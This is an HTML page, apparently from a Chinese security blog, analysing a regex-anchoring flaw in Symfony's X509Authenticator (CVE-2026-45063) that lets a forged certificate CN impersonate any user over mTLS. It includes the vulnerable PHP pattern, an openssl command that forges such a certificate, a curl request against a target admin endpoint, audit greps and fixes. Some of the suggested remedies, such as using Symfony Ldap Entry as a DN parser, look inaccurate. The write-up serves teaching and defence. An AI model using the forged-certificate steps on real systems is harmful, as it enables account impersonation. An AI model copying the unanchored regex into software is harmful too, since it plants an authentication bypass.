@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/cat-final.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/cat-final.png">
+    <link rel="shortcut icon" href="/assets/images/cat-final.png">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>正则锚定缺失→认证绕过：从DN解析到任意用户伪装 — DARKSEC</title>
+<meta name="description" content="一个缺少^锚定的正则，让mTLS证书认证形同虚设。CVE-2026-45063 Symfony X509Authenticator漏洞深度分析。">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 认证绕过 / 正则安全</div>
+        <h1>正则锚定缺失→认证绕过：从DN解析到任意用户伪装 🔐</h1>
+        <div class="article-meta">
+          <span>📅 2026-07-17</span>
+          <span>⏱ 10 min read</span>
+          <span>🏷 正则 / mTLS / 认证绕过 / CVE</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">漏洞概述</a></li>
+            <li><a href="#background">X.509 DN 与正则提取</a></li>
+            <li><a href="#vuln">漏洞根因：缺少锚定</a></li>
+            <li><a href="#exploit">攻击构造与复现</a></li>
+            <li><a href="#code">审计代码示例</a></li>
+            <li><a href="#defense">防御方案</a></li>
+            <li><a href="#generalize">通用攻击模型</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">🎯 漏洞概述</h2>
+        <p>CVE-2026-45063 (CVSS 9.1)：Symfony框架的<code>X509Authenticator</code>在从mTLS客户端证书的DN（Distinguished Name）中提取<code>emailAddress</code>字段时，使用了一个<strong>没有锚定</strong>的正则表达式。攻击者可以构造一个CN字段包含<code>emailAddress=victim@corp.com</code>的证书，正则会错误地匹配到CN中的伪造emailAddress，而非真正的emailAddress字段——从而<strong>以任意用户身份通过认证</strong>。</p>
+
+        <blockquote>
+          <p>🐱 核心洞察：一个<code>^</code>字符的缺失，价值9.1分 nya~</p>
+        </blockquote>
+
+        <h2 id="background">📋 X.509 DN 与正则提取</h2>
+        <p>X.509证书的DN（Distinguished Name）格式如下：</p>
+        <pre><code>CN=Alice Smith, OU=Engineering, O=Corp, emailAddress=alice@corp.com</code></pre>
+        <p>注意关键点：<strong>各RDN之间用逗号分隔，但字段值本身可以包含逗号和等号！</strong></p>
+        <p>开发者通常用正则从DN字符串中提取特定字段：</p>
+        <pre><code class="language-php">// Symfony的X509Authenticator源码
+preg_match('/emailAddress=([^,]+)/', $dn, $matches);
+$email = $matches[1];</code></pre>
+        <p>看起来没问题？往下看 👇</p>
+
+        <h2 id="vuln">🐛 漏洞根因：缺少锚定</h2>
+        <p>正则表达式默认在字符串中<strong>任意位置匹配</strong>。没有<code>^</code>锚定的正则，会从左到右扫描整个字符串，找到<strong>第一个</strong>匹配就返回。</p>
+
+        <p><strong>正常场景：</strong></p>
+        <pre><code>DN: "CN=Alice Smith, OU=Engineering, emailAddress=alice@corp.com"
+正则: /emailAddress=([^,]+)/
+匹配结果: alice@corp.com ✅</code></pre>
+
+        <p><strong>攻击场景：</strong></p>
+        <pre><code>DN: "CN=emailAddress=victim@corp.com, OU=Fake, emailAddress=attacker@evil.com"
+正则: /emailAddress=([^,]+)/
+匹配结果: victim@corp.com ❌ (匹配了CN中的伪造值！)</code></pre>
+
+        <p>攻击者只需要控制证书的<code>CN</code>字段，在其中注入<code>emailAddress=目标用户</code>，正则就会优先匹配到CN中的值，而<strong>真正的emailAddress字段被跳过</strong>。</p>
+
+        <h2 id="exploit">⚡ 攻击构造与复现</h2>
+
+        <h3>Step 1: 生成恶意证书</h3>
+        <pre><code class="language-bash"># 生成包含伪造emailAddress的CN的证书
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \
+  -days 365 -nodes \
+  -subj "/CN=emailAddress=admin@corp.com/O=FakeOrg"</code></pre>
+
+        <h3>Step 2: 使用恶意证书认证</h3>
+        <pre><code class="language-bash"># 向目标发送mTLS请求
+curl --cert cert.pem --key key.pem https://target.internal/api/admin</code></pre>
+
+        <h3>Step 3: 服务器端解析链</h3>
+        <pre><code class="language-php">// 服务器收到证书，提取DN
+$dn = $_SERVER['SSL_CLIENT_S_DN'];
+// DN值: "CN=emailAddress=admin@corp.com, O=FakeOrg"
+
+// 正则提取email（错误地匹配了CN中的值）
+preg_match('/emailAddress=([^,]+)/', $dn, $matches);
+$email = $matches[1]; // "admin@corp.com" ← 被骗了！
+
+// 系统认为你是admin@corp.com → 认证通过</code></pre>
+
+        <blockquote>
+          <p>⚡ 整个攻击不需要破解任何密码学算法——纯粹是字符串解析的逻辑缺陷！</p>
+        </blockquote>
+
+        <h2 id="code">🔍 审计代码示例</h2>
+        <p>在代码审计中，快速定位所有从结构化字符串中用正则提取字段的代码：</p>
+        <pre><code class="language-bash"># 搜索所有从DN/路径/header中提取字段的正则
+grep -rn "preg_match.*=.*\[" --include="*.php" .
+grep -rn "re\.findall.*=" --include="*.py" .
+grep -rn "RegExp.*=" --include="*.js" .
+
+# 特别关注mTLS相关代码
+grep -rn "SSL_CLIENT\|X509\|certificate\|client_cert" --include="*.php" .</code></pre>
+
+        <p><strong>不安全的写法（缺少锚定）：</strong></p>
+        <pre><code class="language-php">// ❌ 危险：没有锚定
+preg_match('/emailAddress=([^,]+)/', $dn, $m);
+
+// ❌ 危险：只锚定了开头，但DN可能从任意字段开始
+preg_match('/^.*emailAddress=([^,]+)/', $dn, $m);</code></pre>
+
+        <p><strong>安全的写法：</strong></p>
+        <pre><code class="language-php">// ✅ 方案1：先按逗号分割，再逐字段匹配
+$parts = str_getcsv($dn, ',');
+foreach ($parts as $part) {
+    if (preg_match('/^\s*emailAddress=(.+)$/', trim($part), $m)) {
+        $email = $m[1];
+        break;
+    }
+}
+
+// ✅ 方案2：使用专用DN解析库
+use Symfony\Component\Ldap\Entry;  // 或 phpseclib
+// 由库正确处理字段边界</code></pre>
+
+        <h2 id="defense">🛡️ 防御方案</h2>
+        <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:16px;margin:16px 0;">
+          <p><strong>1. 永远不要用正则从结构化字符串中提取字段</strong><br>
+          使用专用解析库（如Symfony Ldap、OpenSSL X509 parse）。</p>
+          <p><strong>2. 如果必须用正则，先分割再匹配</strong><br>
+          按字段分隔符分割后，对每个字段单独做<code>^field=(.+)$</code>锚定匹配。</p>
+          <p><strong>3. 验证字段值的合法性</strong><br>
+          email字段应该通过<code>filter_var(FILTER_VALIDATE_EMAIL)</code>验证。</p>
+          <p><strong>4. 最小权限原则</strong><br>
+          即使email提取正确，也要验证该email确实存在于系统中且有权访问目标资源。</p>
+        </div>
+
+        <h2 id="generalize">🌀 通用攻击模型</h2>
+        <p>这个漏洞模式远不止于X.509 DN——<strong>所有从结构化字符串中用正则提取字段的场景都可能受影响</strong>：</p>
+
+        <table style="width:100%;border-collapse:collapse;margin:16px 0;">
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;color:var(--neon-cyan);">场景</td>
+            <td style="padding:8px;color:var(--neon-cyan);">结构化字符串</td>
+            <td style="padding:8px;color:var(--neon-cyan);">攻击手法</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">mTLS证书认证</td>
+            <td style="padding:8px;">X.509 DN</td>
+            <td style="padding:8px;">CN注入emailAddress</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">LDAP认证</td>
+            <td style="padding:8px;">LDAP DN路径</td>
+            <td style="padding:8px;">OU注入CN=admin</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">SAML属性映射</td>
+            <td style="padding:8px;">Assertion XML</td>
+            <td style="padding:8px;">NameID字段注入</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">JWT claim解析</td>
+            <td style="padding:8px;">JSON payload</td>
+            <td style="padding:8px;">嵌套claim覆盖</td>
+          </tr>
+          <tr>
+            <td style="padding:8px;">AWS IAM ARN</td>
+            <td style="padding:8px;">arn:aws:iam::...</td>
+            <td style="padding:8px;">路径段注入role名</td>
+          </tr>
+        </table>
+
+        <blockquote>
+          <p>🐱 记住：<strong>结构化字符串的"解析"不等于"提取"——提取需要精确锚定字段边界，否则就是越界提取</strong> nya~</p>
+        </blockquote>
+
+        <div class="article-tags">
+          <span class="tag pink">正则安全</span>
+          <span class="tag">mTLS</span>
+          <span class="tag">认证绕过</span>
+          <span class="tag purple">CVE-2026-45063</span>
+          <span class="tag yellow">X.509</span>
+        </div>
+
+        <p style="text-align:center;margin-top:32px;color:var(--text-dim);font-style:italic;">
+          ~ 感谢阅读 nya~ 🐱✨
+        </p>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+      <div style="text-align:center;margin-bottom:16px;">
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+        </div>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> SECURITY LAB</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
